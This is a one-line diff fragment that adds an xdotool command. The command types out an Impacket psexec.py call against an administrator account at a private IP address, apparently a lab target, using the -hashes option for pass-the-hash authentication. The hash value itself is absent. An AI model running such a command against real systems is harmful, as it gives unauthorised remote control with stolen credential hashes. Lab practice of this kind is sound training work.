@@ -1,0 +1,1 @@
+xdotool type --delay 10 "psexec.py administrator@10.129.80.76 -hashes "
